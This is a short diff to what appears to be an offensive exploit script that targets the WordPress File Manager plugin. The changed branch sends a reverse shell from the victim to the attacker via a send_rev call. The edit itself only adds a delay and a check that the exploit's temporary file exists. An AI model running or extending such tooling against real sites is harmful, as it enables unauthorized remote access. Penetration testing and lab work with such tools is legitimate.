@@ -94,12 +94,17 @@ def wp_file_manager(victim_info, attacker_info, general_info, exp, arguments):
 			case 7:
 				if arguments.repeat != None:
 					print(color.BLUE + "Reverse Shell" + color.END + color.BOLD + ">" + color.END)
+				# Give server time to process last attack
+				time.sleep(1)
 				start_logging(general_info)
 				time.sleep(1)
 				send_rev(attacker_info, victim_info)
 				
 				# Remove auxiliary file produced by exploit
-				os.remove('./tmp_file_with_dest_url.txt')
+				if os.path.exists('./tmp_file_with_dest_url.txt'):
+					os.remove('./tmp_file_with_dest_url.txt')
+				else:
+					print(color.RED + '[-] This attack failed, WP File Manager failed' + color.END)
 				time.sleep(1)
 				stop_logging(general_info)
 				if i == k-1:
